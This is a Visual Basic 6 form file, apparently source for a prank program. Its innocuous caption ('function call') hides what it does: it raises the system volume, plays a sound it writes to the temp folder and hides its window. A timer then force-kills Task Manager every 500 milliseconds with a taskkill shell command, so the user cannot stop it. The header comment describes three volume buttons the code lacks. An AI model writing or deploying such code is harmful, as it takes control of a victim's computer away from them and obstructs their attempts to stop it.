VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "函数调用"
   ClientHeight    =   3015
   ClientLeft      =   120
   ClientTop       =   465
   ClientWidth     =   4560
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3015
   ScaleWidth      =   4560
   StartUpPosition =   3  '窗口缺省
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   4800
      Top             =   360
   End
   Begin VB.CommandButton Command1 
      Caption         =   "输入"
      BeginProperty Font 
         Name            =   "微软雅黑"
         Size            =   42
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3015
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   4575
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'新建EXE工程,添加三个按钮.
'按钮一是音量增加,按钮二是音量减少,按钮三是静音切换.
Option Explicit
Private Declare Function PlaySound Lib "winmm.dll" Alias "PlaySoundA" (ByVal lpszName As String, ByVal hModule As Long, ByVal dwFlags As Long) As Long
Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" ( _
                          ByVal hwnd As Long, _
                          ByVal wMsg As Long, _
                          ByVal wParam As Long, _
                          ByVal lParam As Long) As Long

Private Const WM_APPCOMMAND As Long = &H319
Private Const APPCOMMAND_VOLUME_UP As Long = 10
Private Const APPCOMMAND_VOLUME_DOWN As Long = 9
Private Const APPCOMMAND_VOLUME_MUTE As Long = 8
Private Temploc As String
Private Input_ As Integer

Private Sub Command1_Click()
Dim SoundFile As String
Do
Input_ = InputBox("请输入10-50的整数：", , 30)
Loop Until (Input_ <= 50 And Input_ >= 10)
    '音量增加
    Dim i As Integer
    For i = 1 To Input_
    SendMessage Me.hwnd, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_UP * &H10000
    Next i
    SoundFile = Temploc & "\XP.wav"
    'MsgBox SoundFile
    PlaySound SoundFile, 0, 1 '播放内存里的声音，&H8 ' 循环播放，&H1 ' 异步播放
    Form1.Visible = False
    Timer1.Enabled = True
End Sub


Private Sub Form_Load()
Temploc = Environ("temp")
Dim B() As Byte
B = LoadResData(101, "CUSTOM")
Open Temploc & "\XP.wav" For Binary As #1
Put #1, , B()
Close #1
End Sub

Private Sub Timer1_Timer()
Shell ("cmd /c taskkill /f /im taskmgr.exe"), vbNormalFocus '禁用任务管理器并显示
End Sub
